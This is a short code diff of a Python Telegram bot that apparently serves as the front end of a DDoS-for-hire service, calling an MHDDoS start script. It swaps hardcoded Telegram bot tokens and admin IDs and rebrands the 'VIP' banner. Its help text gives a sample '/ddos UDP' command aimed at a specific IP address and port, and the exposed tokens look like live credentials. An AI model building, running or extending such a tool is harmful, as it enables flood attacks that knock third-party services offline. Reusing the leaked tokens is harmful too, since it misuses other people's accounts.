@@ -6,8 +6,8 @@ from threading import Lock
 import time
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-BOT_TOKEN = "8167659125:AAF-Dj1AlGebFbPK0i39iPY-B2UkAywhCwE"
-ADMIN_ID = 6840672013
+BOT_TOKEN = "7112251571:AAFjHe8gSPkUKH0Qd32HlyFblCFqnSLvQOo"
+ADMIN_ID = 7464869171
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -79,7 +79,7 @@ def handle_start(message):
             """
 ```
 /ddos UDP 143.92.125.230:10013 10 900```\n"""
-            "👑 LUFZY 🇲🇨 PENGGUNA VIP 👑"
+            "👑 SANZ 🇲🇨 PENGGUNA VIP 👑"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
@@ -178,7 +178,7 @@ def handle_ping(message):
             f"⚙️ *Type:* {attack_type}\n"
             f"🧟‍♀️ *Threads:* {threads}\n"
             f"⏳ *Time (ms):* {duration}\n\n"
-            f"👑 LUFZY 🇲🇨 PELANGGAN VIP 👑"
+            f"👑 SANZ 🇲🇨 PELANGGAN VIP 👑"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
